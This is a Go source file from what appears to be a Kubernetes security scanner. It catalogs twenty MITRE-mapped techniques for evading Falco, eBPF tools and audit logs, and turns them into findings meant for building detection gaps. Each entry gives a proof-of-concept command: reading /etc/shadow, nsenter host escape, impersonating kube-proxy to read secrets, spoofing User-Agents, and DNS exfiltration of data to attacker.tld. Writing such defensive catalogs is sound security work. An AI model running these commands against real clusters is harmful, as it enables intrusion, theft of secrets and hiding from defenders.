package evasion

import (
	"github.com/kube-dementor/kube-dementor/pkg/scanner"
)

type Technique struct {
	ID              string
	Title           string
	Description     string
	MITRE           string
	DetectionLikely string
	Prereqs         string
	PoC             string
	Refs            []string
}

var Catalog = []Technique{
	{
		ID:              "KH-EVA-T001",
		Title:           "Exec via `kubectl debug` instead of `pods/exec`",
		Description:     "Falco's default rule set hooks shell-in-container via pods/exec specifically; kubectl debug creates an *ephemeral container* and many Falco rulesets don't flag that code path.",
		MITRE:           "T1610",
		DetectionLikely: "medium",
		Prereqs:         "You have pods/ephemeralcontainers or can patch .spec.ephemeralContainers on the victim pod.",
		PoC:             `kubectl debug <target-pod> -n <ns> --image=busybox --target=<container>`,
	},
	{
		ID:              "KH-EVA-T002",
		Title:           "Break exec into discrete commands (defeat --strict-shell rules)",
		Description:     "Falco rule `sensitive_mount_from_shell` depends on a shell being spawned. Using `kubectl exec -- /bin/cat /etc/shadow` (no shell) can slip past those rules.",
		MITRE:           "T1059.004",
		DetectionLikely: "high",
		PoC:             `kubectl exec -i <pod> -- /bin/cat /etc/shadow`,
	},
	{
		ID:              "KH-EVA-T003",
		Title:           "Pivot via `nsenter --target 1` instead of host binaries",
		Description:     "From a hostPID/privileged pod, use the host's own /proc/1 namespace; no new binaries uploaded, no new image pulled — minimal noise for image-scanners and Trivy-operator.",
		MITRE:           "T1611",
		DetectionLikely: "medium",
		PoC:             `nsenter -t 1 -m -u -i -n -p -- bash`,
	},
	{
		ID:              "KH-EVA-T004",
		Title:           "Use `kubectl proxy` for a local, credential-less API client",
		Description:     "`kubectl proxy` binds 127.0.0.1:8001 and proxies your cached token, so subsequent curl requests have no Authorization header. Audit logs still record the username, but many log forwarders key on the Authorization-Bearer pattern.",
		MITRE:           "T1550.001",
		DetectionLikely: "low",
		PoC:             "kubectl proxy --port=8001 & curl localhost:8001/api/v1/namespaces",
	},
	{
		ID:              "KH-EVA-T005",
		Title:           "Impersonate a system component to blend in",
		Description:     "If your identity has `impersonate` verb, issue the request as `system:serviceaccount:kube-system:kube-proxy` (or similar). Audit logs show the impersonation chain, but alerts often key on the outer user only.",
		MITRE:           "T1078.004",
		DetectionLikely: "low",
		Prereqs:         "impersonate verb on users/groups/serviceaccounts.",
		PoC:             `kubectl --as=system:serviceaccount:kube-system:kube-proxy get secrets -A`,
	},
	{
		ID:              "KH-EVA-T006",
		Title:           "Prefer list-based RBAC walk over SelfSubjectAccessReview",
		Description:     "SSAR generates a `authorization.k8s.io/selfsubjectaccessreviews:create` audit record. Walking bindings + ClusterRoles + RoleBindings with list calls produces the same information under the much more common `list roles` / `list clusterroles` verbs.",
		MITRE:           "T1069.003",
		DetectionLikely: "low",
	},
	{
		ID:              "KH-EVA-T007",
		Title:           "Exfil via DNS or legitimate webhooks",
		Description:     "If egress is restricted, use DNS resolution (`dig` + a controlled domain) or a legitimate webhook target (Slack/Teams) to stage the data. Network-policy enforcement rarely covers DNS.",
		MITRE:           "T1048.003",
		DetectionLikely: "medium",
		Refs:            []string{"https://posts.specterops.io/k8s-audit-bypass-overview-9a0b65e8f0d2"},
	},
	{
		ID:              "KH-EVA-T008",
		Title:           "Rotate User-Agent to blend with GitOps tools",
		Description:     "Falco and StackRox often alert on `kubectl/vXX.XX`. Rotating your UA to `argocd-controller/2.9.0` or `flux/2.2.0` passes as normal automation.",
		MITRE:           "T1036",
		DetectionLikely: "low",
		PoC:             `curl -H "User-Agent: argocd-controller/2.9.0" https://api:6443/api/...`,
	},
	{
		ID:              "KH-EVA-T009",
		Title:           "Server-side dry-run for high-risk verifications",
		Description:     "DryRun=All round-trips through admission but never persists. Most SIEM rules key on actual object creation; dry-run shows up in audit logs but usually at a lower severity.",
		MITRE:           "T1027",
		DetectionLikely: "medium",
	},
	{
		ID:              "KH-EVA-T010",
		Title:           "Use `nodes/proxy` to reach kubelet without tripping API-server authz",
		Description:     "If you have `get nodes/proxy`, you can transparently tunnel to kubelet APIs through the API-server's proxy endpoint — Falco rarely has rules on this code path.",
		MITRE:           "T1572",
		DetectionLikely: "medium",
		PoC:             `kubectl get --raw /api/v1/nodes/<node>/proxy/pods`,
	},
	{
		ID:              "KH-EVA-T011",
		Title:           "Spawn shell via /proc/self/exe instead of /bin/sh",
		Description:     "Falco's `shell_in_container` macro typically matches `/bin/*sh` or known shell binaries. Re-execing /proc/self/exe of a non-shell process (e.g. a Go binary that drops to a shell) avoids that match path.",
		MITRE:           "T1059.004",
		DetectionLikely: "low",
		Prereqs:         "You can write/upload a custom binary to the container (or use a pre-existing Go service).",
		PoC:             `kubectl exec target -- /proc/self/exe -c "/bin/sh -i"`,
	},
	{
		ID:              "KH-EVA-T012",
		Title:           "DNS exfiltration via the cluster's own kube-dns",
		Description:     "Many egress NetworkPolicies allow DNS to kube-dns. Embed payload in a long subdomain — kube-dns forwards externally and the resolved request is logged at most as a DNS query. Most cluster log forwarders do not inspect DNS query bodies.",
		MITRE:           "T1071.004",
		DetectionLikely: "low",
		PoC:             `dig +short $(echo "stolen-data" | base64 | tr -d '=').attacker.tld`,
	},
	{
		ID:              "KH-EVA-T013",
		Title:           "Bulk SSAR via auth/v1/SelfSubjectRulesReview",
		Description:     "Most pentest scripts loop `kubectl auth can-i ...` which is one POST per check. SSAR returns the entire allowed-rule list in a single call, giving the same intel with 1/100 audit-log entries.",
		MITRE:           "T1087.004",
		DetectionLikely: "low",
		PoC:             `kubectl auth can-i --list --namespace target-ns`,
	},
	{
		ID:              "KH-EVA-T014",
		Title:           "Aggregated APIService → talk to a custom backend, not kube-apiserver",
		Description:     "An aggregated APIService (`apiservices.apiregistration.k8s.io/v1.metrics.k8s.io` etc.) routes the call to a custom backend. The kube-audit log records only the proxied verb, not the underlying call. Useful for in-cluster recon that doesn't trip API-server audit rules.",
		MITRE:           "T1078.004",
		DetectionLikely: "medium",
		PoC:             `kubectl get --raw /apis/custom.metrics.k8s.io/v1beta1/...`,
	},
	{
		ID:              "KH-EVA-T015",
		Title:           "Long-poll watch for credentials / token rotation timing",
		Description:     "`kubectl get secrets --watch` opens a single audit-log entry but yields all subsequent change events. Useful for waiting on a secret rotation or for picking up a freshly-created TokenRequest token.",
		MITRE:           "T1056",
		DetectionLikely: "low",
		PoC:             `kubectl get secrets -A --watch -o yaml`,
	},
	{
		ID:              "KH-EVA-T016",
		Title:           "Anonymous reconnaissance when --anonymous-auth=true",
		Description:     "If the kube-apiserver was started with --anonymous-auth=true (CIS 1.2.1 fail), anonymous requests can hit /readyz, /version, /openapi/v2 — and sometimes /api/v1 read endpoints if RBAC has `system:anonymous` bindings. Audit rules that key on the user are noise-filtered for anonymous traffic in many SIEM defaults.",
		MITRE:           "T1078",
		DetectionLikely: "low",
		PoC:             `curl -k https://api:6443/api/v1/namespaces`,
	},
	{
		ID:              "KH-EVA-T017",
		Title:           "Use a custom User-Agent that mimics a controller",
		Description:     "Audit-log heuristics often suppress events whose user-agent matches `controller-manager/*`, `kube-scheduler/*`, etc. Setting your own UA via the Go client lets you blend in.",
		MITRE:           "T1036",
		DetectionLikely: "medium",
		PoC:             `client.RESTClient().Verb("GET").SetHeader("User-Agent", "kube-controller-manager/v1.30").Do(ctx)`,
	},
	{
		ID:              "KH-EVA-T018",
		Title:           "Server-Side Apply (SSA) with managedFields manipulation",
		Description:     "SSA rewrites the managedFields list. By creating an SSA Patch that takes ownership of fields previously managed by another controller, you can hide your changes behind that controller's identity in field-tracking views.",
		MITRE:           "T1027",
		DetectionLikely: "medium",
		PoC:             `kubectl apply --server-side --field-manager=kube-controller-manager -f patch.yaml`,
	},
	{
		ID:              "KH-EVA-T019",
		Title:           "kubectl cp instead of exec for file write",
		Description:     "`kubectl cp` runs `tar` over an exec session. Falco rule sets that key on `/bin/sh -c` style payloads sometimes miss the tar-only invocation, while still letting you drop arbitrary content into the target container.",
		MITRE:           "T1105",
		DetectionLikely: "medium",
		PoC:             `kubectl cp ./payload.so target-pod:/tmp/payload.so`,
	},
	{
		ID:              "KH-EVA-T020",
		Title:           "Schedule pod with runtimeClassName: gvisor (or kata) to evade eBPF",
		Description:     "gVisor sentries syscalls in user-space; the host kernel sees a small set of regularised calls. eBPF-based detection (Tracee, Tetragon, Falco-modern) often loses fidelity inside gVisor sandboxes. Scheduling a workload with runtimeClassName=gvisor creates a controlled blind spot.",
		MITRE:           "T1611",
		DetectionLikely: "low",
		PoC:             `apiVersion: v1\nkind: Pod\nspec:\n  runtimeClassName: gvisor`,
	},
}

func CatalogFindings(surface *DetectionSurface) []scanner.Finding {
	sev := scanner.SevLow
	if surface != nil && surface.Worst == "aggressive" {
		sev = scanner.SevMedium
	}
	out := make([]scanner.Finding, 0, len(Catalog))
	for _, t := range Catalog {
		out = append(out, scanner.Finding{
			RuleID:   t.ID,
			Category: scanner.CatEvasion,
			Severity: sev,
			Title:    t.Title,
			Description: t.Description +
				"\n\nNOTE: this is a knowledge-base entry; the scanner did NOT execute anything on your cluster. It's included because --stealth was enabled.",
			Resource:       scanner.Resource{Kind: "Technique", Name: t.ID},
			Evidence:       "MITRE " + t.MITRE + " · detection-likely: " + t.DetectionLikely,
			Impact:         "Attacker can reduce detection probability; relevant to SOC preparedness, not exploitability.",
			Recommendation: "Use this to build your detection gap-list; map each entry to a Falco/Tetragon/SIEM rule and verify it fires.",
			References:     t.Refs,
			Tags:           []string{"evasion", "technique", "mitre:" + t.MITRE},
		})
	}
	return out
}
